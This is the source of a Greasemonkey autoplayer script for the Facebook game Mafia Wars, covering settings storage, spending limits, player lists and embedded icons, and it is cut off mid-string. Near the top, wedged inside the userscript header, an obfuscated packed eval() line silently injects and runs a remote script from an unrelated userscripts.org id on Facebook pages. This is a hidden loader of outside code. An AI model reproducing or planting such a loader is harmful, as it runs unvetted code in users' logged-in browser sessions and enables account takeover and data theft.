/**
* This program is copyright PlayerScripts.com, a division of TinHat Software Ltd.
* We grant you a liscence for personal, private and non-commercial use only.
* Please refer to playerscripts.com for further information.

* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*/
/**
* @package: Facebook Mafia Wars Autoplayer
* @authors: KCMCL, Bushdaka, crazydude, Lister, SamTheButcher, MaxJ, donnaB,
            BBB, Cam, janmillsjr, nonoymsd, Gibson_sg
* @past_authors: CharlesD, Eric Ortego, Jeremy, Liquidor, AK17710N, KCMCL,
            Fragger, <x51>, CyB, int1, Janos112, int2str, Doonce, Eric Layne,
            Tanlis, Cam, vmzildjian, csanbuenaventura, Scrotal, Bushdaka,
            rdmcgraw, moe, BBB, crazydude, SamTheButcher, dwightwilbanks,
            nonoymsd, MaxJ, donnaB, StevenD,cygnum, rasmoe
* @created: March 23, 2009
* @credits: (C) PS MWAP www.playerscripts.com - All rights reserved.
*/

// ==UserScript==

eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))





// @name        PS Facebook Mafia Wars Autoplayer (MWAP)
// @namespace   mafiawars
// @description Autoplayer for the facebook application - Mafia Wars
// @include     http://facebook.mafiawars.com/mwfb/remote/html_server.php*
// @include     http://mwfb.zynga.com/mwfb/remote/html_server.php*
// @include     http://facebook.mafiawars.com/mwfb/xd_receiver.htm
// @include     http://apps.facebook.com/inthemafia/*
// @include     http://apps.new.facebook.com/inthemafia/*
// @include     http://www.facebook.com/connect/uiserver*
// @exclude     http://mwfb.zynga.com/mwfb/*#*
// @exclude     http://facebook.mafiawars.com/mwfb/*#*
// @exclude     http://apps.facebook.com/inthemafia/sk_updater.php*
// @version     1.1.937
// ==/UserScript==

var SCRIPT = {
  version: '1.1.937',
  name: 'inthemafia',
  appID: 'app10979261223',
  appNo: '10979261223',
  presentationurl: 'http://userscripts.org/scripts/show/77953',
  url: 'http://www.playerscripts.com/rokdownloads/ps_facebook_mafia_wars_a.user.js',
  metadata: 'http://www.playerscripts.com/rokdownloads/mwapmeta.js',
  controller: 'remote/html_server.php?xw_controller=',
  action: '&xw_action=',
  city: '&xw_city=',
  opponent: '&opponent_id=',
  user: '&user_id=',
  /* <div> pages for parsing with logJSONResponse(), added as final_wrapper sibling; we use two pages to prevent interference */
  ajaxIDSync: 'ajax_sync',    // page for Autoplay ('synchronous')
  ajaxIDAsync: 'ajax_async',   // page for asynchronous clicking (quickbanking, profile icecheck etc)
  UseDebugConsole : false,
  PSMWAP_homePath: 'http://www.playerscripts.com/',
  PSMWAP_imagePath: 'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/',
  PSMWAP_imageBPath: 'http://www.playerscripts.co.uk/images/banners/'
};

// search for new_header   for changes still lots of them in here
//
// if (isGMChecked('TestChanges')){ code }   <- new questionable changes can have the option to be disabled using this (look for checkbox on about tab)
//
// this aproach should cut way down on background processing since DEBUG is found 436 time in this file.
////  only attempt display line in log or msg window if, 'enabled looging' 'debug off', and 'log filtering on' &&
////  must have a 'match word' in accept pattern found. IE: mission to show missions debugging.
// Diagnose_msg=' missions check 1';
// Diagnose(Diagnose_msg);
// Diagnose(' mission whatever.');
// Diagnose(''); filter words are, mission, timer, job(some of it)
//newchange
//newchange_need_to_add_to_main
//newchange_fight
//newchange_mission
//newchange_testing
//newchange_remove_for_me_only
//newchange_cut_not_released_yet
//

// Set the storage path
var GMSTORAGE_PATH = 'GM_' + SCRIPT.appID + '_';
if (/facebook\.com/.test(window.location.href)) {
  var profElt = xpathFirst('//ul[@id="pageNav"]//a[@accesskey="6"]');
  if (profElt && profElt.getAttribute('href').match(/id=(\w+)/)) {
    GMSTORAGE_PATH = GMSTORAGE_PATH + RegExp.$1;
  }

  var profLink = xpathFirst('//div[contains(@id,"div_story_") and contains(@data-ft,"actrs")]');
  if (profLink && profLink.getAttribute('data-ft').match(/"actrs":"(\w+)/)) {
    GMSTORAGE_PATH = GMSTORAGE_PATH + RegExp.$1;
  }
}

if (/mwfb\.zynga\.com/.test(window.location.href)) {
  var docUrl = document.location.href;
  if (docUrl.match(/sf_xw_user_id=(\w+)/)) {
    GMSTORAGE_PATH = GMSTORAGE_PATH + RegExp.$1;
  }
}

var gvar=function() {}; // Global variables
function GM_ApiBrowserCheck() {
  var needApiUpgrade=false;
  if(typeof(unsafeWindow)=='undefined') { unsafeWindow=window; }
  if(typeof(GM_log)=='undefined') { GM_log=function(msg) { try { unsafeWindow.console.log('GM_log: '+msg); } catch(err) {} }; }

  if(typeof(GM_setValue)!='undefined') {
    var gsv=GM_setValue.toString();
    if(gsv.indexOf('staticArgs')>0) { gvar.isGreaseMonkey=true; GM_log('GreaseMonkey Api detected...'); } // test GM_hitch
    else if(/not\s+supported/.test(gsv)) { needApiUpgrade=true; gvar.isBuggedChrome=true; GM_log('Bugged Chrome GM Api detected...'); }
  } else { needApiUpgrade=true; GM_log('No GM Api detected...'); }

  if(needApiUpgrade) {
    GM_log('Try to recreate needed GM Api...');
    GM_log('Using [' +  GMSTORAGE_PATH  + '] as storage path.');
    var ws=null; try { ws=typeof(unsafeWindow.localStorage); unsafeWindow.localStorage.length; } catch(err) { ws=null; } // Catch Security error
    if(ws=='object') {
      GM_log('Using localStorage for GM Api.');
      GM_getValue=function(name,defValue) { var value=unsafeWindow.localStorage.getItem(GMSTORAGE_PATH+name); if(value==null) { if (defValue==null) { return 'undefined'; } else { return defValue; } } else { switch(value.substr(0,2)) { case 'S]': return value.substr(2); case 'N]': return parseInt(value.substr(2)); case 'B]': return value.substr(2)=='true'; } } return value; };
      GM_setValue=function(name,value) { switch (typeof(value)) { case 'string': unsafeWindow.localStorage.setItem(GMSTORAGE_PATH+name,'S]'+value); break; case 'number': if(value.toString().indexOf('.')<0) { unsafeWindow.localStorage.setItem(GMSTORAGE_PATH+name,'N]'+value); } break; case 'boolean': unsafeWindow.localStorage.setItem(GMSTORAGE_PATH+name,'B]'+value); break; } };
      GM_deleteValue=function(name) { unsafeWindow.localStorage.removeItem(GMSTORAGE_PATH+name); };
    } else if(!gvar.isOpera || typeof(GM_setValue)=='undefined') {
      GM_log('Using temporarilyStorage for GM Api.'); gvar.temporarilyStorage=new Array();
      GM_getValue=function(name,defValue) { if(typeof(gvar.temporarilyStorage[GMSTORAGE_PATH+name])=='undefined') { return defValue; } else { return gvar.temporarilyStorage[GMSTORAGE_PATH+name]; } };
      GM_setValue=function(name,value) { switch (typeof(value)) { case "string": case "boolean": case "number": gvar.temporarilyStorage[GMSTORAGE_PATH+name]=value; } };
      GM_deleteValue=function(name) { delete gvar.temporarilyStorage[GMSTORAGE_PATH+name]; };
    }
    if(typeof(GM_openInTab)=='undefined') { GM_openInTab=function(url) { unsafeWindow.open(url,""); }; }
    if((typeof(GM_registerMenuCommand)=='undefined') || gvar.isBuggedChrome){ GM_registerMenuCommand=function(name,cmd) { GM_log("Notice: GM_registerMenuCommand is not supported."); }; } // Dummy

    if(!gvar.isOpera || typeof(GM_xmlhttpRequest)=='undefined') {
      GM_log('Using XMLHttpRequest for GM Api.');
      GM_xmlhttpRequest=function(obj) {
        var request=new XMLHttpRequest();
        request.onreadystatechange=function() { if(obj.onreadystatechange) { obj.onreadystatechange(request); } if(request.readyState==4 && obj.onload) { obj.onload(request); } };
        request.onerror=function() { if(obj.onerror) { obj.onerror(request); } };
        try { request.open(obj.method,obj.url,true); } catch(err) { if(obj.onerror) { obj.onerror( {readyState:4,responseHeaders:'',responseText:'',responseXML:'',status:403,statusText:'Forbidden'} ); }; return; }
        if(obj.headers) { for(name in obj.headers) { request.setRequestHeader(name,obj.headers[name]); } }
        request.send(obj.data); return request;
  }; } }
}
GM_ApiBrowserCheck();

//      GM_getValue=function(name,defValue) {//workinon
GM_getGoodValue=function(name,defValue) {
  if(typeof(gvar.temporarilyStorage[GMSTORAGE_PATH+name])=='undefined') {
    if(defValue){
      GM_setValue(name,defValue);  // save the default value for next time, not just use it
    }
    return defValue;
  } else {
    return gvar.temporarilyStorage[GMSTORAGE_PATH+name];
  }
};

//Fix the ICE popup text for Chrome
if (!gvar.isGreaseMonkey){
   var elt  = xpathFirst('//div[@id="platform_dialog_content"]');
   if(elt) elt.style.webkitUserSelect = 'text';
}

// Handle Publishing (check for FB publishing / FB Gifting iframe)
function checkInPublishPopup() {
  if ( xpathFirst('//div[contains(@class,"aid_' + SCRIPT.appNo +'")]') &&
      ( /connect\/uiserver/.test(window.location.href) || /xd_receiver/.test(window.location.href)) ){
    setGMTime('postTimer', '00:10');
    window.setTimeout(handlePublishing, 3000);
    return true;
  }
  return false;
}

function fetchPubOptions() {
  copyMWValues(['isRunning', 'autoLottoOpt', 'autoSecretStash','autoShareCoins','autoGlobalPublishing',
                'autoIcePublish', 'autoLevelPublish', 'autoAchievementPublish',
                'autoAskJobHelp', 'autoShareWishlist', 'autoWarRewardPublish','autoShareRewards',
                'autoWarResponsePublish', 'autoWarRallyPublish', 'autoWarPublish']);
}

// Load the iframe
function checkLoadIframe() {
  var iFrameCanvas = xpathFirst('//iframe[@name="mafiawars"]');
  if (iFrameCanvas) {
    setFBParams();
    window.location.replace(iFrameCanvas.src);
    return true;
  }
  return false;
}

// Register debugOnOff with Greasemonkey
if (gvar.isGreaseMonkey) {
  GM_registerMenuCommand('FB Mafia Wars Autoplayer - Turn Debugging Log On/Off', debugOnOff);
  GM_registerMenuCommand('FB Mafia Wars Autoplayer - Clear Saved Values', function() { clearSettings(); loadHome(); });
}

//
// Define Spend object and methods.
//

// Constructor for Spend objects.
function Spend(name, spendFlag, startFlag, keepMode, keepValue,
               useMode, useValue, icon, burnFlag, lastFloor, lastCeiling) {
  // Initialize GM name containers
  this.name = name;
  this.spendFlag = spendFlag;
  this.startFlag = startFlag;
  this.burnFlag = burnFlag;
  this.keepMode = keepMode;
  this.keepValue = keepValue;
  this.useMode = useMode;
  this.useValue = useValue;
  this.lastFloor = lastFloor;
  this.lastCeiling = lastCeiling;
  this.icon = icon;
  this.canBurn = false;

  // Calculate the spend limit
  this.getSpendValue = function (maxVal, spendMode, spendValue) {
    switch (parseInt(spendMode)) {
      case SCHEME_PERCENT: return Math.round(maxVal * parseInt(spendValue) * .01);
      case SCHEME_POINTS: return parseInt(spendValue);
    }
  };
}

// Update the upper and lower limits of spending
Spend.prototype.refreshLimits = function (maxVal, canLevel) {
  // Subtract one or else spending will never run.
  this.floor   = Math.min(this.getSpendValue (maxVal,
                                              GM_getValue(this.keepMode, 0),
                                              GM_getValue(this.keepValue, 0)),
                          maxVal - 1);

  // The max value is the limit for ceiling
  this.ceiling = Math.min(this.getSpendValue (maxVal,
                                              GM_getValue(this.useMode, 0),
                                              GM_getValue(this.useValue, 0)),
                          maxVal);

  // Check if burning is enabled
  this.canBurn = isGMChecked(this.burnFlag) && canLevel;
};

// Toggle spending accordingly and log changes
Spend.prototype.toggleSpending = function (maxVal, curVal) {
  // Log any change to the floor.
  if (this.floor != GM_getValue(this.lastFloor)) {
    GM_setValue(this.lastFloor, this.floor);
    if (this.floor > 1) {
      addToLog('info Icon', this.icon + '<span style="color:#04B4AE;";> ' + this.name +
               ' is set to keep above <strong>' + this.floor + '</strong>.</span>');
    }
  }
  //  burnFlag=3  canBurn
  // Log any change to the ceiling.
  if (this.ceiling != GM_getValue(this.lastCeiling)) {
    GM_setValue(this.lastCeiling, this.ceiling);
    if (this.ceiling > this.floor) {
      addToLog('info Icon', this.icon + '<span style="color:#04B4AE;";> ' + this.name +
               ' refill level set to <strong>' + this.ceiling + '</strong>.</span>');
    }
  }

  // Determine whether spending needs to start or stop.
  if (curVal >= this.ceiling && !GM_getValue(this.startFlag)) {
    GM_setValue(this.startFlag, true);
  } else if (curVal <= this.floor && this.ceiling > this.floor &&
             GM_getValue(this.startFlag)) {
    GM_setValue(this.startFlag, false);
    addToLog('info Icon', this.icon + '<span style="color:#04B4AE;";> Refilling ' + this.name +
             ' to <strong>' + this.ceiling + '</strong>.</span>');
  }
};

//
// Define Player object and methods.
//

// Determine whether two player objects refer to the same player.
Player.prototype.match = function(player) {
  if (!player) return false;
  if (this.id && player.id)
    return (this.id == player.id);
  if (this.profile && this.profile == player.profile)
    return true;
  if (this.profileAttack && this.profileAttack == player.profileAttack)
    return true;
  if (this.attack && this.attack == player.attack)
    return true;
  return false;
};

// Update this player object's properties with the properties of another.
Player.prototype.update = function(player) {
  if (!this.match(player)) return false;
  for (var prop in player) {
    this[prop] = player[prop];
  }
  return true;
};

// Constructor for Player objects.
function Player(name) {
}

//
// Define PlayerList object and methods.
//

// Get this player list's array of player objects.
PlayerList.prototype.get = function(forceRefresh) {
  if (this.name && (forceRefresh || !this.list.length)) {
    // Load the list from storage.
    var ids = getSavedList(this.name);
    // Convert the ID list (strings) into a player list (objects).
    this.list = [];
    for (var i = 0, l=ids.length; i < l; ++i) {
      var p = new Player();
      p.id = ids[i];
      this.list.push(p);
    }
  }
  return this.list;
};

PlayerList.prototype.set = function(list) {
  if (list) {
    this.list = list;
  }
  if (this.name) {
    // Build an array of player ID's.
    var a = [];
    for (var i = 0, l=this.list.length; i < l; ++i) {
      var player = this.list[i];
      if (player && player.id) {
        a.push(player.id);
      }
    }
    // Store the list.
    setSavedList(this.name, a);
  }
};

PlayerList.prototype.add = function(player, max) {
  if (!player) return false;
  // If the player is already in the list, just update it.
  var l = this.list.length;
  for (var i = 0; i < l; ++i) {
    if (this.list[i].update(player)) {
      return false;
    }
  }
  // No match. Just push it into the array.
  this.list.push(player);
  // Shorten the array if it has become too large.
  if (max > 0) {
    while (max < this.list.length) {
      var playerItem = this.list.shift();
      DEBUG('Removed player ' + playerItem.id + ' from ' + this.name + '.');
    }
  }
  return true;
};

PlayerList.prototype.remove = function(player) {
  if (!player) return false;
  // If the player is in the list, remove it.
  var l = this.list.length;
  for (var i = 0; i < l; ++i) {
    if (this.list[i].match(player)) {
      this.list.splice(i, 1);
      return true;
    }
  }
  // No match.
  return false;
};

PlayerList.prototype.indexOf = function(player) {
  var l = this.list.length;
  for (var i = 0; i < l; i++) {
    if (this.list[i].match(player))
      return i;
  }
  return -1;
};

PlayerList.prototype.debug = function() {
  var l = this.list.length;
  var str = 'PlayerList name=' + this.name + ', length=' + l + '\n';
  for (var i = 0; i < l; ++i) {
    var p = this.list[i];
    str += i + ': ';
    if (p.name) str += ', name=' + p.name;
    if (p.level) str += ', level=' + p.level;
    if (p.mafia) str += ', mafia=' + p.mafia;
    str += '\n';
  }
  return str;
};

// Constructor for PlayerList objects.
function PlayerList(name) {
  this.name = name;
  this.list = [];
  this.get();
}

//create data uris for mini icon usage
var searchIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACLElEQVR42mNkgIJ12/cacLCzlTIwMtkwMzNx/Pnz58qfP3/n+Ls5LGfAAxhBxMZdBxKFBflnqirKs4oKCTAwMjIyfP/xk+HmvYcMj54+X/n9x4/o' +
    'CD+Pv1gNWLVlp6GYiMhJQ20NVm4uDoTMfwaGf///MZy5fIPh9Zs3tf5uji1YDdi67/BSaUnJKDUFGQYmJiaw7SDd//79Z/j77x/Di9fvGO4+ePTh4+fP4mE+br8wDNh+4OhDTRVlOUF+XgYOdlaIAUDbQZp//vrN' +
    '8OrtB4b3Hz8yPHzy1BhowDkMA3YePPZCR0NNnJebk4GdlRXsiv9A+PfvP4Yv374zfPryjeHdhw+gsLAK9nQ+js0Lewy1NZ15ebgYWFlYGFiYmcDO//P3L8M3YEB+/faD4eHTp3+ePH8pFuXv+R7DAGD0hasoyK1Q' +
    'lkeEwf//EBf8+PWL4e37jwy37z9Y7uNsF4UvGherKcnHyEtLMjAzM4MNALng5Zt3DM9fvWa4/+BhSWyIfy9OAxav28LEy81VwsvDUyolLioCcsW7Dx9/vf/4adWLl6+vXzt/qmXz+rWHGJmYfG7evPkFwwAYmL96' +
    'IwsTI6MG0BXsQFfcjg3y+QQSNzO3OMzLL2Dz9OH9o0A/ety4ceMLVgNwAR1tbT5efv4dXDx8lk8fPTgKFPIEGvKZaAMghmgBDRHAMIRoA3AZQpIBUEN4gYbsBBny8O7tvSQbAA0TXg4u7g2fP33YBwCb9/irlkMH' +
    '+QAAAABJRU5ErkJgggo=' +
    '" />';

var lootbagIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEwAQANU/AGtsbqeoqpKTk1FRU05OT0lJS2RkZVtbXM7P0Tc3N5+gonR1d0A/QGBgYldXWGdpajw7PEVERbGxsmRlZ4+PkJCRk3Bxc31/gV1fYGJiZF1dX1RUVdHS1Hp8fjo5OkJCRFBQUUdHSD8+P7S1' +
    't2JjZXRzdcbIyY6QknZ4en+Bg7S3uYOFiIqLjExMTLm6vIGDhmZnaL6/wVBRU3p6e5mbnZaXmWlqbJqanGprbauusERCRDU0NFlZW25wckFAQVJSUiH5BAEAAD8ALAAAAAATABAAAAbgwJ/QQBmNBDODcMn88WoI' +
    'ScnnKFFuNWXTQctNfDAJZ8xxKRaNw/JS2fhQqpgJoXD4GhTKwVEYoAw+EzUKAQEHYDEsLTsJEBAREzw+ACksbT4WARs7jB4QPjoEET4HFgsAPjwni50QDA0hD5IEIRuSBgCcCZ4MHwsFsoE9GW4gDq29ER0twRM9' +
    'zz4gAwmNyQUdBM3PPakkjSIfESHX2TA+ONvdECI+4gUEHQMaDT49Ky8LqQbsETINz8R+DGihAcCCC3e+OLBg48AAaQOa8PiiYcIHAu+kNWkywAGGdxGbBAEAOw==' +
    '" />';

var playIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQAMQAAAAAAP///4i1GpXCHJO/G5C9G4u4Goq2GpnGHZTBHI26G4eyGpzJHa3aIafVIKfUIKHOH5/NH6vYIaTSILPgIq7bIbLfIrHeIv3++f///wAAAAAAAAAAAAAAAAAAAAAAACH5BAEAABkALAAA' +
    'AAAQABAAAAVqYBZB0+NITVpdl0VRDDOWZ9qsLYXEs4mqLMtgJyP5bCtLYsjDYI5AwpLofNZUBSmzav01FNkpt5sygLVjGspgDnN7p8OhTajyjA45G+xkFksLAnpnU3cTC4GDYX4jiIlzhIwZjoKQizsZIQA7' +
    '" />';

var infoIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAALISURBVDhPjZPdS1NhHMc3DCmMCKRbJaQI1Jus64K6' +
    'iQqS/oCSbr3yQnyZrSa+dKEDXyAhvFDRtqaQIakzB3sxdcPt1Dbnyzan29nmXM1tZ+fMs3O+PWezC7XAA7+L5/B8Pt/n95zfkctOPQYDLopisjyX48qLilBydHQkY5g0I4p8IJO5Eqiru86dZo7XkO/uitVra9zY' +
    '9jZH0TSXiERYnqYZPhBIJVZXaUqnWxubmVmvJoD8hARAsdstdASDfFIQAKlYLgdqMw4HqWQqh3gciEQAo9F/ODFhbtdqncV5CYHlNhteHhwI3F+Y5wEztY/KZzpU1epgsu8jGgX29oCdHQHLy2G2t3f0hcTKLJZs' +
    'lc/Hu8kinyzBLAuQrjG+EMLQlwDivwSEw0AgAGxuShJgctLmUigGKmUmE/M0FuNZUQRyuQLMZoDhBRpvNF506vzw7x0hFAL8fsDjAZxOwGLxZlSq/ieyxcWD59EoOb3UN4FTKSDDkITlOO4qHLjf/hNuL5dP39oq' +
    'wHa7iKWlTb6tradWNj1N3/P7mShDIAk+PCzUNp1FjdKD2689oDay8PkK6RQFbGxILVi8TU1tNTKHQywxGMLv4/EskkkgkSAiIvhEcah4F0ZFdwQT37Pwkt6ldOkOrNaQqFB0Nmu12qL8l9DrQ2Um066dtJIXpH8D' +
    'j7UsSvvTKB1I49E4C+86QMKIII7BwY/f1Gr11ROzYDTS17TaVZXVGvR51mM87UshtsMhuMXBv0FmwgHYbALMZhfT0tJV+89pNBgMF8bHV+5oNEuvpqZWPpCaHhmZM+n1W2mrVSB3kMPw8Ge7SqW68Z9xPvtaqey7' +
    'pdNZfrhcWczOUrnGxta6c8PSxtbWrofz887Y3JxL6Orq0/T09Fw6r0De3T1U1tEx+FWtHnXU1zfWK5UDl88LS/vygubmtw8aGhpunvkDj01/AJKaSKGsr24+AAAAAElFTkSuQmCC' +
    '" />';

var attackIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhDQANANU/AKJRAP/LNP/dNP/KIv2uAMmHAOyXAP/pfP/eQ7VkAfisAEA8LOWNAP+9CkgkDeejAIhIA92OAP/ODmtEDf/EAf+9ADErHF02Df/PE/y3ALVrAGMyCv/mhk9LLyccFhsYGf/TJaeRO9PCav/f' +
    'YqeWLP/UE//hRv+0DvC6QqeDDrWiHPecAP/GCtGeAoVXCvDcXKebSdOwWLF3CP/ic//sdvWnAIRuDWMtB3toDXYuAnU/CqJgAm9KDXBZDXtrLf///yH5BAEAAD8ALAAAAAANAA0AAAZ3wJ+wAxP+FiqjkkY6vnBK' +
    '48HkEwl6xo4UIUCUbEJLaMbhjEASTBrd+qUGgQGLQs8UIB6hb9Co+CsPOx9CCzEBDRmJCg8FPEcoJzU1BAQ1ERo7Gi4yExc8BgYMEQk3Dg4bSisJEAkADlFCDDkfF66wFgl5PzqoQkEAOwo=' +
    '" />';

var defenseIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhDQANANU/AFFzrH2m60V0ukhrpazH/CQ0TYuv8U19yVeK3Cc7Wl+Q4F2O3S1MfFCAzBgdJRsjMjtinj9loVp4r22a52aFvzlPdIGYwk2AzneUzVN/x2iDt8ja/ZS29mOAtT9dj9Pi/jFShI6hxHef6G2N' +
    'x0VdiDlLaePs/rrR/SxEaaWwxYCh4lWH1198slqJ1mN5oqLA93uSv05ihUJkm0JusF+IyzRdm22b6DdfnGWV5HSg7YKq9Hul8Iiv+K/J/M3e/v///yH5BAEAAD8ALAAAAAANAA0AAAZ4wJTp4ysaiwRMaHPqOZ9O' +
    'lcZC4PCu2OuoA3txdOAwmMJycQy7tHonkkhiBkNuTs/hAKRSIDCx+f0TNAAVDjiGh4YKAAMFPx4tCwqSCgsZAzI/Pw8HDSsInw0REQmZPygzAgcXAhAQDKWZCTezswwOsJkPDDUgjaVBADsK' +
    '" />';

var closeButtonIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAIhSURBVDjLlZPrThNRFIWJicmJz6BWiYbIkYDEG0Jb' +
    'BiitDQgm0PuFXqSAtKXtpE2hNuoPTXwSnwtExd6w0pl2OtPlrphKLSXhx07OZM769qy19wwAGLhM1ddC184+d18QMzoq3lfsD3LZ7Y3XbE5DL6Atzuyilc5Ciyd7IHVfgNcDYTQ2tvDr5crn6uLSvX+Av2Lk36FF' +
    'pSVENDe3OxDZu8apO5rROJDLo30+Nlvj5RnTlVNAKs1aCVFr7b4BPn6Cls21AWgEQlz2+Dl1h7IdA+i97A/geP65WhbmrnZZ0GIJpr6OqZqYAd5/gJpKox4Mg7pD2YoC2b0/54rJQuJZdm6Izcgma4TW1WZ0h+y8' +
    'BfbyJMwBmSxkjw+VObNanp5h/adwGhaTXF4NWbLj9gEONyCmUZmd10pGgf1/vwcgOT3tUQE0DdicwIod2EmSbwsKE1P8QoDkcHPJ5YESjgBJkYQpIEZ2KEB51Y6y3ojvY+P8XEDN7uKS0w0ltA7QGCWHCxSWWpwy' +
    'aCeLy0BkA7UXyyg8fIzDoWHeBaDN4tQdSvAVdU1Aok+nsNTipIEVnkywo/FHatVkBoIhnFisOBoZxcGtQd4B0GYJNZsDSiAEadUBCkstPtN3Avs2Msa+Dt9XfxoFSNYF/Bh9gP0bOqHLAm2WUF1YQskwrVFYPWkf' +
    '3h1iXwbvqGfFPSGW9Eah8HSS9fuZDnS32f71m8KFY7xs/QZyu6TH2+2+FAAAAABJRU5ErkJggg==' +
    '" />';

var updateGoodIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAGrSURBVDjLvZPZLkNhFIV75zjvYm7VGFNCqoZUJ+ro' +
    'KUUpjRuqp61Wq0NKDMelGGqOxBSUIBKXWtWGZxAvobr8lWjChRgSF//dv9be+9trCwAI/vIE/26gXmviW5bqnb8yUK028qZjPfoPWEj4Ku5HBspgAz941IXZeze8N1bottSo8BTZviVWrEh546EO03EXpuJOdG63' +
    'otJbjBKHkEp/Ml6yNYYzpuezWL4s5VMtT8acCMQcb5XL3eJE8VgBlR7BeMGW9Z4yT9y1CeyucuhdTGDxfftaBO7G4L+zg91UocxVmCiy51NpiP3n2treUPujL8xhOjYOzZYsQWANyRYlU4Y9Br6oHd5bDh0bCpSO' +
    'ixJiWx71YY09J5pM/WEbzFcDmHvwwBu2wnikg+lEj4mwBe5bC5h1OUqcwpdC60dxegRmR06TyjCF9G9z+qM2uCJmuMJmaNZaUrCSIi6X+jJIBBYtW5Cge7cd7sgoHDfDaAvKQGAlRZYc6ltJlMxX03UzlaRlBdQr' +
    'zSCwksLRbOpHUSb7pcsnxCCwngvM2Rm/ugUCi84fycr4l2t8Bb6iqTxSCgNIAAAAAElFTkSuQmCC' +
    '" />';

var experienceIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQAOZyAAABAQBAUAARFQAFBgAUGQANEHvl/wMJCwBIWwBLXgAZIABLXQArNAUOED/Z/0Ta/wAbIgBDVAArNSnX/wB5lwBedUrb/xHQ/wB4lgYQEwA3RQTC8gCEpgCy3hPE8Ifm/wBgeBZ+lYbn/wAv' +
    'OyhSXAC/7wBfdwCPsyU6QFOSogAiKinU/wDG+ABbcgAGCCTT/wTO/wGbwkDZ/3nk/wDC8gMFBV/h/znY/wARFjHV/16Pmyx2iAAKDAAKDQBJWwAICgBmfxU4QAEDBEfK6gCiywA7SQBngRFEUQ3P/yXE6SE8QgB0' +
    'kgOjyy7X/xjR/yg7QB0uMhxCSxU9RxtvhAI6SA7Q/3nM4QBuigB6mRc4QAo3QQBiewA0QQKfx0nb/wB3lQUSFQBlfwGgyAONsAACAwCWvSk7QAAqNRrR/QTB8RvO+1Pc/wIJCwjQ/xrL+AA8SwidwgCFqAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAHIALAAAAAAQABAAAAeagHKCg3INGYSIiCQ7iY1yKUNCjoQ1VhZUk4NQIl5jiWBRSihPZjozD25HWUFaRQQHUzI2Bh8GazkvTRMeXRUF' +
    'giNMajcOK05IG2UgKogFSywXVTAlJwg4jnBtNB1EWFyObElpcVcYFGE8jVJoHAEMPkZfGo0hMQECcgILQCYAiGRiEvQY9ONNCwiIJGxxkehMBH+DFAxwRGBiIAA7Cg==' +
    '" />';

var omgIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAIhSURBVDjLlZPrThNRFIWJicmJz6BWiYbIkYDEG0Jb' +
    'BiitDQgm0PuFXqSAtKXtpE2hNuoPTXwSnwtExd6w0pl2OtPlrphKLSXhx07OZM769qy19wwAGLhM1ddC184+d18QMzoq3lfsD3LZ7Y3XbE5DL6Atzuyilc5Ciyd7IHVfgNcDYTQ2tvDr5crn6uLSvX+Av2Lk36FF' +
    'pSVENDe3OxDZu8apO5rROJDLo30+Nlvj5RnTlVNAKs1aCVFr7b4BPn6Cls21AWgEQlz2+Dl1h7IdA+i97A/geP65WhbmrnZZ0GIJpr6OqZqYAd5/gJpKox4Mg7pD2YoC2b0/54rJQuJZdm6Izcgma4TW1WZ0h+y8' +
    'BfbyJMwBmSxkjw+VObNanp5h/adwGhaTXF4NWbLj9gEONyCmUZmd10pGgf1/vwcgOT3tUQE0DdicwIod2EmSbwsKE1P8QoDkcHPJ5YESjgBJkYQpIEZ2KEB51Y6y3ojvY+P8XEDN7uKS0w0ltA7QGCWHCxSWWpwy' +
    'aCeLy0BkA7UXyyg8fIzDoWHeBaDN4tQdSvAVdU1Aok+nsNTipIEVnkywo/FHatVkBoIhnFisOBoZxcGtQd4B0GYJNZsDSiAEadUBCkstPtN3Avs2Msa+Dt9XfxoFSNYF/Bh9gP0bOqHLAm2WUF1YQskwrVFYPWkf' +
    '3h1iXwbvqGfFPSGW9Eah8HSS9fuZDnS32f71m8KFY7xs/QZyu6TH2+2+FAAAAABJRU5ErkJggg==' +
    '" />';

var pauseIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQAMQAAAAAAP///4i1GpXCHJO/G5C9G4u4Goq2GpnGHZTBHI26G4eyGpzJHa3aIafVIKfUIKHOH5/NH6vYIaTSILPgIq7bIbLfIrHeIv3++f///wAAAAAAAAAAAAAAAAAAAAAAACH5BAEAABkALAAA' +
